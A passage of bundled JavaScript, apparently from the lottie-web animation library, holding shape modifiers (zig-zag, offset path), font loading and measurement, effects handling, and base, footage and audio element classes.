          ht = a.v[o === 0 ? a._length - 1 : o - 1],
          gt = a.v[(o + 1) % a._length],
          St =
            nt === 2
              ? Math.sqrt(
                  Math.pow(ft[0] - ht[0], 2) + Math.pow(ft[1] - ht[1], 2)
                )
              : 0,
          vt =
            nt === 2
              ? Math.sqrt(
                  Math.pow(ft[0] - gt[0], 2) + Math.pow(ft[1] - gt[1], 2)
                )
              : 0;
        setPoint(
          i,
          a.v[o % a._length],
          st,
          ot,
          s,
          vt / ((tt + 1) * 2),
          St / ((tt + 1) * 2)
        );
      }
      function zigZagSegment(i, a, o, s, tt, nt) {
        for (var ot = 0; ot < s; ot += 1) {
          var st = (ot + 1) / (s + 1),
            ft =
              tt === 2
                ? Math.sqrt(
                    Math.pow(a.points[3][0] - a.points[0][0], 2) +
                      Math.pow(a.points[3][1] - a.points[0][1], 2)
                  )
                : 0,
            ht = a.normalAngle(st),
            gt = a.point(st);
          setPoint(i, gt, ht, nt, o, ft / ((s + 1) * 2), ft / ((s + 1) * 2)),
            (nt = -nt);
        }
        return nt;
      }
      (ZigZagModifier.prototype.processPath = function (i, a, o, s) {
        var tt = i._length,
          nt = shapePool.newElement();
        if (((nt.c = i.c), i.c || (tt -= 1), tt === 0)) return nt;
        var ot = -1,
          st = PolynomialBezier.shapeSegment(i, 0);
        zigZagCorner(nt, i, 0, a, o, s, ot);
        for (var ft = 0; ft < tt; ft += 1)
          (ot = zigZagSegment(nt, st, a, o, s, -ot)),
            ft === tt - 1 && !i.c
              ? (st = null)
              : (st = PolynomialBezier.shapeSegment(i, (ft + 1) % tt)),
            zigZagCorner(nt, i, ft + 1, a, o, s, ot);
        return nt;
      }),
        (ZigZagModifier.prototype.processShapes = function (i) {
          var a,
            o,
            s = this.shapes.length,
            tt,
            nt,
            ot = this.amplitude.v,
            st = Math.max(0, Math.round(this.frequency.v)),
            ft = this.pointsType.v;
          if (ot !== 0) {
            var ht, gt;
            for (o = 0; o < s; o += 1) {
              if (
                ((ht = this.shapes[o]),
                (gt = ht.localShapeCollection),
                !(!ht.shape._mdf && !this._mdf && !i))
              )
                for (
                  gt.releaseShapes(),
                    ht.shape._mdf = !0,
                    a = ht.shape.paths.shapes,
                    nt = ht.shape.paths._length,
                    tt = 0;
                  tt < nt;
                  tt += 1
                )
                  gt.addShape(this.processPath(a[tt], ot, st, ft));
              ht.shape.paths = ht.localShapeCollection;
            }
          }
          this.dynamicProperties.length || (this._mdf = !1);
        });
      function linearOffset(i, a, o) {
        var s = Math.atan2(a[0] - i[0], a[1] - i[1]);
        return [polarOffset(i, s, o), polarOffset(a, s, o)];
      }
      function offsetSegment(i, a) {
        var o, s, tt, nt, ot, st, ft;
        (ft = linearOffset(i.points[0], i.points[1], a)),
          (o = ft[0]),
          (s = ft[1]),
          (ft = linearOffset(i.points[1], i.points[2], a)),
          (tt = ft[0]),
          (nt = ft[1]),
          (ft = linearOffset(i.points[2], i.points[3], a)),
          (ot = ft[0]),
          (st = ft[1]);
        var ht = lineIntersection(o, s, tt, nt);
        ht === null && (ht = s);
        var gt = lineIntersection(ot, st, tt, nt);
        return gt === null && (gt = ot), new PolynomialBezier(o, ht, gt, st);
      }
      function joinLines(i, a, o, s, tt) {
        var nt = a.points[3],
          ot = o.points[0];
        if (s === 3 || pointEqual(nt, ot)) return nt;
        if (s === 2) {
          var st = -a.tangentAngle(1),
            ft = -o.tangentAngle(0) + Math.PI,
            ht = lineIntersection(
              nt,
              polarOffset(nt, st + Math.PI / 2, 100),
              ot,
              polarOffset(ot, st + Math.PI / 2, 100)
            ),
            gt = ht ? pointDistance(ht, nt) : pointDistance(nt, ot) / 2,
            St = polarOffset(nt, st, 2 * gt * roundCorner);
          return (
            i.setXYAt(St[0], St[1], "o", i.length() - 1),
            (St = polarOffset(ot, ft, 2 * gt * roundCorner)),
            i.setTripleAt(ot[0], ot[1], ot[0], ot[1], St[0], St[1], i.length()),
            ot
          );
        }
        var vt = pointEqual(nt, a.points[2]) ? a.points[0] : a.points[2],
          _t = pointEqual(ot, o.points[1]) ? o.points[3] : o.points[1],
          Et = lineIntersection(vt, nt, ot, _t);
        return Et && pointDistance(Et, nt) < tt
          ? (i.setTripleAt(
              Et[0],
              Et[1],
              Et[0],
              Et[1],
              Et[0],
              Et[1],
              i.length()
            ),
            Et)
          : nt;
      }
      function getIntersection(i, a) {
        var o = i.intersections(a);
        return (
          o.length && floatEqual(o[0][0], 1) && o.shift(),
          o.length ? o[0] : null
        );
      }
      function pruneSegmentIntersection(i, a) {
        var o = i.slice(),
          s = a.slice(),
          tt = getIntersection(i[i.length - 1], a[0]);
        return (
          tt &&
            ((o[i.length - 1] = i[i.length - 1].split(tt[0])[0]),
            (s[0] = a[0].split(tt[1])[1])),
          i.length > 1 &&
          a.length > 1 &&
          ((tt = getIntersection(i[0], a[a.length - 1])), tt)
            ? [[i[0].split(tt[0])[0]], [a[a.length - 1].split(tt[1])[1]]]
            : [o, s]
        );
      }
      function pruneIntersections(i) {
        for (var a, o = 1; o < i.length; o += 1)
          (a = pruneSegmentIntersection(i[o - 1], i[o])),
            (i[o - 1] = a[0]),
            (i[o] = a[1]);
        return (
          i.length > 1 &&
            ((a = pruneSegmentIntersection(i[i.length - 1], i[0])),
            (i[i.length - 1] = a[0]),
            (i[0] = a[1])),
          i
        );
      }
      function offsetSegmentSplit(i, a) {
        var o = i.inflectionPoints(),
          s,
          tt,
          nt,
          ot;
        if (o.length === 0) return [offsetSegment(i, a)];
        if (o.length === 1 || floatEqual(o[1], 1))
          return (
            (nt = i.split(o[0])),
            (s = nt[0]),
            (tt = nt[1]),
            [offsetSegment(s, a), offsetSegment(tt, a)]
          );
        (nt = i.split(o[0])), (s = nt[0]);
        var st = (o[1] - o[0]) / (1 - o[0]);
        return (
          (nt = nt[1].split(st)),
          (ot = nt[0]),
          (tt = nt[1]),
          [offsetSegment(s, a), offsetSegment(ot, a), offsetSegment(tt, a)]
        );
      }
      function OffsetPathModifier() {}
      extendPrototype([ShapeModifier], OffsetPathModifier),
        (OffsetPathModifier.prototype.initModifierProperties = function (i, a) {
          (this.getValue = this.processKeys),
            (this.amount = PropertyFactory.getProp(i, a.a, 0, null, this)),
            (this.miterLimit = PropertyFactory.getProp(i, a.ml, 0, null, this)),
            (this.lineJoin = a.lj),
            (this._isAnimated = this.amount.effectsSequence.length !== 0);
        }),
        (OffsetPathModifier.prototype.processPath = function (i, a, o, s) {
          var tt = shapePool.newElement();
          tt.c = i.c;
          var nt = i.length();
          i.c || (nt -= 1);
          var ot,
            st,
            ft,
            ht = [];
          for (ot = 0; ot < nt; ot += 1)
            (ft = PolynomialBezier.shapeSegment(i, ot)),
              ht.push(offsetSegmentSplit(ft, a));
          if (!i.c)
            for (ot = nt - 1; ot >= 0; ot -= 1)
              (ft = PolynomialBezier.shapeSegmentInverted(i, ot)),
                ht.push(offsetSegmentSplit(ft, a));
          ht = pruneIntersections(ht);
          var gt = null,
            St = null;
          for (ot = 0; ot < ht.length; ot += 1) {
            var vt = ht[ot];
            for (
              St && (gt = joinLines(tt, St, vt[0], o, s)),
                St = vt[vt.length - 1],
                st = 0;
              st < vt.length;
              st += 1
            )
              (ft = vt[st]),
                gt && pointEqual(ft.points[0], gt)
                  ? tt.setXYAt(
                      ft.points[1][0],
                      ft.points[1][1],
                      "o",
                      tt.length() - 1
                    )
                  : tt.setTripleAt(
                      ft.points[0][0],
                      ft.points[0][1],
                      ft.points[1][0],
                      ft.points[1][1],
                      ft.points[0][0],
                      ft.points[0][1],
                      tt.length()
                    ),
                tt.setTripleAt(
                  ft.points[3][0],
                  ft.points[3][1],
                  ft.points[3][0],
                  ft.points[3][1],
                  ft.points[2][0],
                  ft.points[2][1],
                  tt.length()
                ),
                (gt = ft.points[3]);
          }
          return ht.length && joinLines(tt, St, ht[0][0], o, s), tt;
        }),
        (OffsetPathModifier.prototype.processShapes = function (i) {
          var a,
            o,
            s = this.shapes.length,
            tt,
            nt,
            ot = this.amount.v,
            st = this.miterLimit.v,
            ft = this.lineJoin;
          if (ot !== 0) {
            var ht, gt;
            for (o = 0; o < s; o += 1) {
              if (
                ((ht = this.shapes[o]),
                (gt = ht.localShapeCollection),
                !(!ht.shape._mdf && !this._mdf && !i))
              )
                for (
                  gt.releaseShapes(),
                    ht.shape._mdf = !0,
                    a = ht.shape.paths.shapes,
                    nt = ht.shape.paths._length,
                    tt = 0;
                  tt < nt;
                  tt += 1
                )
                  gt.addShape(this.processPath(a[tt], ot, ft, st));
              ht.shape.paths = ht.localShapeCollection;
            }
          }
          this.dynamicProperties.length || (this._mdf = !1);
        });
      function getFontProperties(i) {
        for (
          var a = i.fStyle ? i.fStyle.split(" ") : [],
            o = "normal",
            s = "normal",
            tt = a.length,
            nt,
            ot = 0;
          ot < tt;
          ot += 1
        )
          switch (((nt = a[ot].toLowerCase()), nt)) {
            case "italic":
              s = "italic";
              break;
            case "bold":
              o = "700";
              break;
            case "black":
              o = "900";
              break;
            case "medium":
              o = "500";
              break;
            case "regular":
            case "normal":
              o = "400";
              break;
            case "light":
            case "thin":
              o = "200";
              break;
          }
        return { style: s, weight: i.fWeight || o };
      }
      var FontManager = (function () {
        var i = 5e3,
          a = { w: 0, size: 0, shapes: [], data: { shapes: [] } },
          o = [];
        o = o.concat([
          2304, 2305, 2306, 2307, 2362, 2363, 2364, 2364, 2366, 2367, 2368,
          2369, 2370, 2371, 2372, 2373, 2374, 2375, 2376, 2377, 2378, 2379,
          2380, 2381, 2382, 2383, 2387, 2388, 2389, 2390, 2391, 2402, 2403,
        ]);
        var s = 127988,
          tt = 917631,
          nt = 917601,
          ot = 917626,
          st = 65039,
          ft = 8205,
          ht = 127462,
          gt = 127487,
          St = ["d83cdffb", "d83cdffc", "d83cdffd", "d83cdffe", "d83cdfff"];
        function vt(Mt) {
          var Ft = Mt.split(","),
            Tt,
            At = Ft.length,
            Lt = [];
          for (Tt = 0; Tt < At; Tt += 1)
            Ft[Tt] !== "sans-serif" &&
              Ft[Tt] !== "monospace" &&
              Lt.push(Ft[Tt]);
          return Lt.join(",");
        }
        function _t(Mt, Ft) {
          var Tt = createTag("span");
          Tt.setAttribute("aria-hidden", !0), (Tt.style.fontFamily = Ft);
          var At = createTag("span");
          (At.innerText = "giItT1WQy@!-/#"),
            (Tt.style.position = "absolute"),
            (Tt.style.left = "-10000px"),
            (Tt.style.top = "-10000px"),
            (Tt.style.fontSize = "300px"),
            (Tt.style.fontVariant = "normal"),
            (Tt.style.fontStyle = "normal"),
            (Tt.style.fontWeight = "normal"),
            (Tt.style.letterSpacing = "0"),
            Tt.appendChild(At),
            document.body.appendChild(Tt);
          var Lt = At.offsetWidth;
          return (
            (At.style.fontFamily = vt(Mt) + ", " + Ft),
            { node: At, w: Lt, parent: Tt }
          );
        }
        function Et() {
          var Mt,
            Ft = this.fonts.length,
            Tt,
            At,
            Lt = Ft;
          for (Mt = 0; Mt < Ft; Mt += 1)
            this.fonts[Mt].loaded
              ? (Lt -= 1)
              : this.fonts[Mt].fOrigin === "n" || this.fonts[Mt].origin === 0
              ? (this.fonts[Mt].loaded = !0)
              : ((Tt = this.fonts[Mt].monoCase.node),
                (At = this.fonts[Mt].monoCase.w),
                Tt.offsetWidth !== At
                  ? ((Lt -= 1), (this.fonts[Mt].loaded = !0))
                  : ((Tt = this.fonts[Mt].sansCase.node),
                    (At = this.fonts[Mt].sansCase.w),
                    Tt.offsetWidth !== At &&
                      ((Lt -= 1), (this.fonts[Mt].loaded = !0))),
                this.fonts[Mt].loaded &&
                  (this.fonts[Mt].sansCase.parent.parentNode.removeChild(
                    this.fonts[Mt].sansCase.parent
                  ),
                  this.fonts[Mt].monoCase.parent.parentNode.removeChild(
                    this.fonts[Mt].monoCase.parent
                  )));
          Lt !== 0 && Date.now() - this.initTime < i
            ? setTimeout(this.checkLoadedFontsBinded, 20)
            : setTimeout(this.setIsLoadedBinded, 10);
        }
        function Ct(Mt, Ft) {
          var Tt = document.body && Ft ? "svg" : "canvas",
            At,
            Lt = getFontProperties(Mt);
          if (Tt === "svg") {
            var jt = createNS("text");
            (jt.style.fontSize = "100px"),
              jt.setAttribute("font-family", Mt.fFamily),
              jt.setAttribute("font-style", Lt.style),
              jt.setAttribute("font-weight", Lt.weight),
              (jt.textContent = "1"),
              Mt.fClass
                ? ((jt.style.fontFamily = "inherit"),
                  jt.setAttribute("class", Mt.fClass))
                : (jt.style.fontFamily = Mt.fFamily),
              Ft.appendChild(jt),
              (At = jt);
          } else {
            var Dt = new OffscreenCanvas(500, 500).getContext("2d");
            (Dt.font = Lt.style + " " + Lt.weight + " 100px " + Mt.fFamily),
              (At = Dt);
          }
          function Ut(Ht) {
            return Tt === "svg"
              ? ((At.textContent = Ht), At.getComputedTextLength())
              : At.measureText(Ht).width;
          }
          return { measureText: Ut };
        }
        function Pt(Mt, Ft) {
          if (!Mt) {
            this.isLoaded = !0;
            return;
          }
          if (this.chars) {
            (this.isLoaded = !0), (this.fonts = Mt.list);
            return;
          }
          if (!document.body) {
            (this.isLoaded = !0),
              Mt.list.forEach(function (Zt) {
                (Zt.helper = Ct(Zt)), (Zt.cache = {});
              }),
              (this.fonts = Mt.list);
            return;
          }
          var Tt = Mt.list,
            At,
            Lt = Tt.length,
            jt = Lt;
          for (At = 0; At < Lt; At += 1) {
            var Dt = !0,
              Ut,
              Ht;
            if (
              ((Tt[At].loaded = !1),
              (Tt[At].monoCase = _t(Tt[At].fFamily, "monospace")),
              (Tt[At].sansCase = _t(Tt[At].fFamily, "sans-serif")),
              !Tt[At].fPath)
            )
              (Tt[At].loaded = !0), (jt -= 1);
            else if (Tt[At].fOrigin === "p" || Tt[At].origin === 3) {
              if (
                ((Ut = document.querySelectorAll(
                  'style[f-forigin="p"][f-family="' +
                    Tt[At].fFamily +
                    '"], style[f-origin="3"][f-family="' +
                    Tt[At].fFamily +
                    '"]'
                )),
                Ut.length > 0 && (Dt = !1),
                Dt)
              ) {
                var Kt = createTag("style");
                Kt.setAttribute("f-forigin", Tt[At].fOrigin),
                  Kt.setAttribute("f-origin", Tt[At].origin),
                  Kt.setAttribute("f-family", Tt[At].fFamily),
                  (Kt.type = "text/css"),
                  (Kt.innerText =
                    "@font-face {font-family: " +
                    Tt[At].fFamily +
                    "; font-style: normal; src: url('" +
                    Tt[At].fPath +
                    "');}"),
                  Ft.appendChild(Kt);
              }
            } else if (Tt[At].fOrigin === "g" || Tt[At].origin === 1) {
              for (
                Ut = document.querySelectorAll(
                  'link[f-forigin="g"], link[f-origin="1"]'
                ),
                  Ht = 0;
                Ht < Ut.length;
                Ht += 1
              )
                Ut[Ht].href.indexOf(Tt[At].fPath) !== -1 && (Dt = !1);
              if (Dt) {
                var qt = createTag("link");
                qt.setAttribute("f-forigin", Tt[At].fOrigin),
                  qt.setAttribute("f-origin", Tt[At].origin),
                  (qt.type = "text/css"),
                  (qt.rel = "stylesheet"),
                  (qt.href = Tt[At].fPath),
                  document.body.appendChild(qt);
              }
            } else if (Tt[At].fOrigin === "t" || Tt[At].origin === 2) {
              for (
                Ut = document.querySelectorAll(
                  'script[f-forigin="t"], script[f-origin="2"]'
                ),
                  Ht = 0;
                Ht < Ut.length;
                Ht += 1
              )
                Tt[At].fPath === Ut[Ht].src && (Dt = !1);
              if (Dt) {
                var Qt = createTag("link");
                Qt.setAttribute("f-forigin", Tt[At].fOrigin),
                  Qt.setAttribute("f-origin", Tt[At].origin),
                  Qt.setAttribute("rel", "stylesheet"),
                  Qt.setAttribute("href", Tt[At].fPath),
                  Ft.appendChild(Qt);
              }
            }
            (Tt[At].helper = Ct(Tt[At], Ft)),
              (Tt[At].cache = {}),
              this.fonts.push(Tt[At]);
          }
          jt === 0
            ? (this.isLoaded = !0)
            : setTimeout(this.checkLoadedFonts.bind(this), 100);
        }
        function bt(Mt) {
          if (Mt) {
            this.chars || (this.chars = []);
            var Ft,
              Tt = Mt.length,
              At,
              Lt = this.chars.length,
              jt;
            for (Ft = 0; Ft < Tt; Ft += 1) {
              for (At = 0, jt = !1; At < Lt; )
                this.chars[At].style === Mt[Ft].style &&
                  this.chars[At].fFamily === Mt[Ft].fFamily &&
                  this.chars[At].ch === Mt[Ft].ch &&
                  (jt = !0),
                  (At += 1);
              jt || (this.chars.push(Mt[Ft]), (Lt += 1));
            }
          }
        }
        function xt(Mt, Ft, Tt) {
          for (var At = 0, Lt = this.chars.length; At < Lt; ) {
            if (
              this.chars[At].ch === Mt &&
              this.chars[At].style === Ft &&
              this.chars[At].fFamily === Tt
            )
              return this.chars[At];
            At += 1;
          }
          return (
            ((typeof Mt == "string" && Mt.charCodeAt(0) !== 13) || !Mt) &&
              console &&
              console.warn &&
              !this._warned &&
              ((this._warned = !0),
              console.warn(
                "Missing character from exported characters list: ",
                Mt,
                Ft,
                Tt
              )),
            a
          );
        }
        function yt(Mt, Ft, Tt) {
          var At = this.getFontByName(Ft),
            Lt = Mt;
          if (!At.cache[Lt]) {
            var jt = At.helper;
            if (Mt === " ") {
              var Dt = jt.measureText("|" + Mt + "|"),
                Ut = jt.measureText("||");
              At.cache[Lt] = (Dt - Ut) / 100;
            } else At.cache[Lt] = jt.measureText(Mt) / 100;
          }
          return At.cache[Lt] * Tt;
        }
        function wt(Mt) {
          for (var Ft = 0, Tt = this.fonts.length; Ft < Tt; ) {
            if (this.fonts[Ft].fName === Mt) return this.fonts[Ft];
            Ft += 1;
          }
          return this.fonts[0];
        }
        function $t(Mt) {
          var Ft = 0,
            Tt = Mt.charCodeAt(0);
          if (Tt >= 55296 && Tt <= 56319) {
            var At = Mt.charCodeAt(1);
            At >= 56320 &&
              At <= 57343 &&
              (Ft = (Tt - 55296) * 1024 + At - 56320 + 65536);
          }
          return Ft;
        }
        function kt(Mt, Ft) {
          var Tt = Mt.toString(16) + Ft.toString(16);
          return St.indexOf(Tt) !== -1;
        }
        function Rt(Mt) {
          return Mt === ft;
        }
        function It(Mt) {
          return Mt === st;
        }
        function Ot(Mt) {
          var Ft = $t(Mt);
          return Ft >= ht && Ft <= gt;
        }
        function Nt(Mt) {
          return Ot(Mt.substr(0, 2)) && Ot(Mt.substr(2, 2));
        }
        function zt(Mt) {
          return o.indexOf(Mt) !== -1;
        }
        function Bt(Mt, Ft) {
          var Tt = $t(Mt.substr(Ft, 2));
          if (Tt !== s) return !1;
          var At = 0;
          for (Ft += 2; At < 5; ) {
            if (((Tt = $t(Mt.substr(Ft, 2))), Tt < nt || Tt > ot)) return !1;
            (At += 1), (Ft += 2);
          }
          return $t(Mt.substr(Ft, 2)) === tt;
        }
        function Wt() {
          this.isLoaded = !0;
        }
        var Gt = function () {
          (this.fonts = []),
            (this.chars = null),
            (this.typekitLoaded = 0),
            (this.isLoaded = !1),
            (this._warned = !1),
            (this.initTime = Date.now()),
            (this.setIsLoadedBinded = this.setIsLoaded.bind(this)),
            (this.checkLoadedFontsBinded = this.checkLoadedFonts.bind(this));
        };
        (Gt.isModifier = kt),
          (Gt.isZeroWidthJoiner = Rt),
          (Gt.isFlagEmoji = Nt),
          (Gt.isRegionalCode = Ot),
          (Gt.isCombinedCharacter = zt),
          (Gt.isRegionalFlag = Bt),
          (Gt.isVariationSelector = It),
          (Gt.BLACK_FLAG_CODE_POINT = s);
        var Vt = {
          addChars: bt,
          addFonts: Pt,
          getCharData: xt,
          getFontByName: wt,
          measureText: yt,
          checkLoadedFonts: Et,
          setIsLoaded: Wt,
        };
        return (Gt.prototype = Vt), Gt;
      })();
      function SlotManager(i) {
        this.animationData = i;
      }
      SlotManager.prototype.getProp = function (i) {
        return this.animationData.slots && this.animationData.slots[i.sid]
          ? Object.assign(i, this.animationData.slots[i.sid].p)
          : i;
      };
      function slotFactory(i) {
        return new SlotManager(i);
      }
      function RenderableElement() {}
      RenderableElement.prototype = {
        initRenderable: function () {
          (this.isInRange = !1),
            (this.hidden = !1),
            (this.isTransparent = !1),
            (this.renderableComponents = []);
        },
        addRenderableComponent: function (a) {
          this.renderableComponents.indexOf(a) === -1 &&
            this.renderableComponents.push(a);
        },
        removeRenderableComponent: function (a) {
          this.renderableComponents.indexOf(a) !== -1 &&
            this.renderableComponents.splice(
              this.renderableComponents.indexOf(a),
              1
            );
        },
        prepareRenderableFrame: function (a) {
          this.checkLayerLimits(a);
        },
        checkTransparency: function () {
          this.finalTransform.mProp.o.v <= 0
            ? !this.isTransparent &&
              this.globalData.renderConfig.hideOnTransparent &&
              ((this.isTransparent = !0), this.hide())
            : this.isTransparent && ((this.isTransparent = !1), this.show());
        },
        checkLayerLimits: function (a) {
          this.data.ip - this.data.st <= a && this.data.op - this.data.st > a
            ? this.isInRange !== !0 &&
              ((this.globalData._mdf = !0),
              (this._mdf = !0),
              (this.isInRange = !0),
              this.show())
            : this.isInRange !== !1 &&
              ((this.globalData._mdf = !0), (this.isInRange = !1), this.hide());
        },
        renderRenderable: function () {
          var a,
            o = this.renderableComponents.length;
          for (a = 0; a < o; a += 1)
            this.renderableComponents[a].renderFrame(this._isFirstFrame);
        },
        sourceRectAtTime: function () {
          return { top: 0, left: 0, width: 100, height: 100 };
        },
        getLayerSize: function () {
          return this.data.ty === 5
            ? { w: this.data.textData.width, h: this.data.textData.height }
            : { w: this.data.width, h: this.data.height };
        },
      };
      var getBlendMode = (function () {
        var i = {
          0: "source-over",
          1: "multiply",
          2: "screen",
          3: "overlay",
          4: "darken",
          5: "lighten",
          6: "color-dodge",
          7: "color-burn",
          8: "hard-light",
          9: "soft-light",
          10: "difference",
          11: "exclusion",
          12: "hue",
          13: "saturation",
          14: "color",
          15: "luminosity",
        };
        return function (a) {
          return i[a] || "";
        };
      })();
      function SliderEffect(i, a, o) {
        this.p = PropertyFactory.getProp(a, i.v, 0, 0, o);
      }
      function AngleEffect(i, a, o) {
        this.p = PropertyFactory.getProp(a, i.v, 0, 0, o);
      }
      function ColorEffect(i, a, o) {
        this.p = PropertyFactory.getProp(a, i.v, 1, 0, o);
      }
      function PointEffect(i, a, o) {
        this.p = PropertyFactory.getProp(a, i.v, 1, 0, o);
      }
      function LayerIndexEffect(i, a, o) {
        this.p = PropertyFactory.getProp(a, i.v, 0, 0, o);
      }
      function MaskIndexEffect(i, a, o) {
        this.p = PropertyFactory.getProp(a, i.v, 0, 0, o);
      }
      function CheckboxEffect(i, a, o) {
        this.p = PropertyFactory.getProp(a, i.v, 0, 0, o);
      }
      function NoValueEffect() {
        this.p = {};
      }
      function EffectsManager(i, a) {
        var o = i.ef || [];
        this.effectElements = [];
        var s,
          tt = o.length,
          nt;
        for (s = 0; s < tt; s += 1)
          (nt = new GroupEffect(o[s], a)), this.effectElements.push(nt);
      }
      function GroupEffect(i, a) {
        this.init(i, a);
      }
      extendPrototype([DynamicPropertyContainer], GroupEffect),
        (GroupEffect.prototype.getValue =
          GroupEffect.prototype.iterateDynamicProperties),
        (GroupEffect.prototype.init = function (i, a) {
          (this.data = i),
            (this.effectElements = []),
            this.initDynamicPropertyContainer(a);
          var o,
            s = this.data.ef.length,
            tt,
            nt = this.data.ef;
          for (o = 0; o < s; o += 1) {
            switch (((tt = null), nt[o].ty)) {
              case 0:
                tt = new SliderEffect(nt[o], a, this);
                break;
              case 1:
                tt = new AngleEffect(nt[o], a, this);
                break;
              case 2:
                tt = new ColorEffect(nt[o], a, this);
                break;
              case 3:
                tt = new PointEffect(nt[o], a, this);
                break;
              case 4:
              case 7:
                tt = new CheckboxEffect(nt[o], a, this);
                break;
              case 10:
                tt = new LayerIndexEffect(nt[o], a, this);
                break;
              case 11:
                tt = new MaskIndexEffect(nt[o], a, this);
                break;
              case 5:
                tt = new EffectsManager(nt[o], a);
                break;
              default:
                tt = new NoValueEffect(nt[o]);
                break;
            }
            tt && this.effectElements.push(tt);
          }
        });
      function BaseElement() {}
      BaseElement.prototype = {
        checkMasks: function () {
          if (!this.data.hasMask) return !1;
          for (var a = 0, o = this.data.masksProperties.length; a < o; ) {
            if (
              this.data.masksProperties[a].mode !== "n" &&
              this.data.masksProperties[a].cl !== !1
            )
              return !0;
            a += 1;
          }
          return !1;
        },
        initExpressions: function () {
          var a = getExpressionInterfaces();
          if (a) {
            var o = a("layer"),
              s = a("effects"),
              tt = a("shape"),
              nt = a("text"),
              ot = a("comp");
            (this.layerInterface = o(this)),
              this.data.hasMask &&
                this.maskManager &&
                this.layerInterface.registerMaskInterface(this.maskManager);
            var st = s.createEffectsInterface(this, this.layerInterface);
            this.layerInterface.registerEffectsInterface(st),
              this.data.ty === 0 || this.data.xt
                ? (this.compInterface = ot(this))
                : this.data.ty === 4
                ? ((this.layerInterface.shapeInterface = tt(
                    this.shapesData,
                    this.itemsData,
                    this.layerInterface
                  )),
                  (this.layerInterface.content =
                    this.layerInterface.shapeInterface))
                : this.data.ty === 5 &&
                  ((this.layerInterface.textInterface = nt(this)),
                  (this.layerInterface.text =
                    this.layerInterface.textInterface));
          }
        },
        setBlendMode: function () {
          var a = getBlendMode(this.data.bm),
            o = this.baseElement || this.layerElement;
          o.style["mix-blend-mode"] = a;
        },
        initBaseData: function (a, o, s) {
          (this.globalData = o),
            (this.comp = s),
            (this.data = a),
            (this.layerId = createElementID()),
            this.data.sr || (this.data.sr = 1),
            (this.effectsManager = new EffectsManager(
              this.data,
              this,
              this.dynamicProperties
            ));
        },
        getType: function () {
          return this.type;
        },
        sourceRectAtTime: function () {},
      };
      function FrameElement() {}
      FrameElement.prototype = {
        initFrame: function () {
          (this._isFirstFrame = !1),
            (this.dynamicProperties = []),
            (this._mdf = !1);
        },
        prepareProperties: function (a, o) {
          var s,
            tt = this.dynamicProperties.length;
          for (s = 0; s < tt; s += 1)
            (o ||
              (this._isParent &&
                this.dynamicProperties[s].propType === "transform")) &&
              (this.dynamicProperties[s].getValue(),
              this.dynamicProperties[s]._mdf &&
                ((this.globalData._mdf = !0), (this._mdf = !0)));
        },
        addDynamicProperty: function (a) {
          this.dynamicProperties.indexOf(a) === -1 &&
            this.dynamicProperties.push(a);
        },
      };
      function FootageElement(i, a, o) {
        this.initFrame(),
          this.initRenderable(),
          (this.assetData = a.getAssetData(i.refId)),
          (this.footageData = a.imageLoader.getAsset(this.assetData)),
          this.initBaseData(i, a, o);
      }
      (FootageElement.prototype.prepareFrame = function () {}),
        extendPrototype(
          [RenderableElement, BaseElement, FrameElement],
          FootageElement
        ),
        (FootageElement.prototype.getBaseElement = function () {
          return null;
        }),
        (FootageElement.prototype.renderFrame = function () {}),
        (FootageElement.prototype.destroy = function () {}),
        (FootageElement.prototype.initExpressions = function () {
          var i = getExpressionInterfaces();
          if (i) {
            var a = i("footage");
            this.layerInterface = a(this);
          }
        }),
        (FootageElement.prototype.getFootageData = function () {
          return this.footageData;
        });
      function AudioElement(i, a, o) {
        this.initFrame(),
          this.initRenderable(),
          (this.assetData = a.getAssetData(i.refId)),
          this.initBaseData(i, a, o),
          (this._isPlaying = !1),
          (this._canPlay = !1);
        var s = this.globalData.getAssetsPath(this.assetData);
        (this.audio = this.globalData.audioController.createAudio(s)),
          (this._currentTime = 0),
          this.globalData.audioController.addAudio(this),
          (this._volumeMultiplier = 1),
          (this._volume = 1),
          (this._previousVolume = null),
          (this.tm = i.tm
            ? PropertyFactory.getProp(this, i.tm, 0, a.frameRate, this)
            : { _placeholder: !0 }),
          (this.lv = PropertyFactory.getProp(
            this,
            i.au && i.au.lv ? i.au.lv : { k: [100] },
            1,
            0.01,
            this
          ));
      }
      (AudioElement.prototype.prepareFrame = function (i) {
        if (
          (this.prepareRenderableFrame(i, !0),
          this.prepareProperties(i, !0),
          this.tm._placeholder)
        )
          this._currentTime = i / this.data.sr;
        else {
          var a = this.tm.v;
          this._currentTime = a;
        }
        this._volume = this.lv.v[0];
        var o = this._volume * this._volumeMultiplier;
        this._previousVolume !== o &&
          ((this._previousVolume = o), this.audio.volume(o));
      }),
        extendPrototype(
          [RenderableElement, BaseElement, FrameElement],
          AudioElement
        ),
        (AudioElement.prototype.renderFrame = function () {
          this.isInRange &&
            this._canPlay &&
            (this._isPlaying
              ? (!this.audio.playing() ||
                  Math.abs(
                    this._currentTime / this.globalData.frameRate -
                      this.audio.seek()
                  ) > 0.1) &&
                this.audio.seek(this._currentTime / this.globalData.frameRate)
              : (this.audio.play(),
                this.audio.seek(this._currentTime / this.globalData.frameRate),
                (this._isPlaying = !0)));
        }),
        (AudioElement.prototype.show = function () {}),
        (AudioElement.prototype.hide = function () {
          this.audio.pause(), (this._isPlaying = !1);
        }),
        (AudioElement.prototype.pause = function () {
          this.audio.pause(), (this._isPlaying = !1), (this._canPlay = !1);
        }),
        (AudioElement.prototype.resume = function () {
          this._canPlay = !0;
        }),
        (AudioElement.prototype.setRate = function (i) {
          this.audio.rate(i);
        }),
        (AudioElement.prototype.volume = function (i) {
          (this._volumeMultiplier = i),
            (this._previousVolume = i * this._volume),
            this.audio.volume(this._previousVolume);
        }),
        (AudioElement.prototype.getBaseElement = function () {
          return null;
        }),
        (AudioElement.prototype.destroy = function () {}),
        (AudioElement.prototype.sourceRectAtTime = function () {}),
        (AudioElement.prototype.initExpressions = function () {});
      function BaseRenderer() {}
      (BaseRenderer.prototype.checkLayers = function (i) {
        var a,
          o = this.layers.length,
          s;
        for (this.completeLayers = !0, a = o - 1; a >= 0; a -= 1)
          this.elements[a] ||
            ((s = this.layers[a]),
            s.ip - s.st <= i - this.layers[a].st &&
              s.op - s.st > i - this.layers[a].st &&
              this.buildItem(a)),
            (this.completeLayers = this.elements[a] ? this.completeLayers : !1);
        this.checkPendingElements();
      }),
        (BaseRenderer.prototype.createItem = function (i) {
          switch (i.ty) {
            case 2:
              return this.createImage(i);
            case 0:
              return this.createComp(i);
            case 1:
              return this.createSolid(i);
            case 3:
              return this.createNull(i);
            case 4:
              return this.createShape(i);
            case 5:
